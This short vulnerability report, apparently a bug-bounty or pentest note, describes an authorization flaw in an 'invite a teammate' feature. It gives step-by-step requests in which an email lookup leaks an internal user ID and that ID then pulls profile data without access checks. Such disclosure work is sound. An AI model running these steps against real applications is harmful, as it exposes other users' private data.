## Use case

The vulnerability was found in an 'invite a teammate' feature where an internal user ID was exposed through an email lookup, allowing unauthorized access to user profile data without proper access controls.

## Steps to test

1. Log in to the application.
2. Use the 'invite a teammate' feature to input a known email address.
3. Capture the network request to GET /api/users/findByEmail/email@example.com.
4. Extract the internal user ID from the response.
5. Use the internal user ID to make a request to GET /api/users/profileInfo/{user_id}.
6. Observe the returned user profile data without any authorization checks.

## Commands

```text
GET /api/users/findByEmail/email@example.com
GET /api/users/profileInfo/6a269d144ba22a3f01b7b284
userId: 6a269d144ba22a3f01b7b284
GET /api/users/profileInfo/{user_id}
```
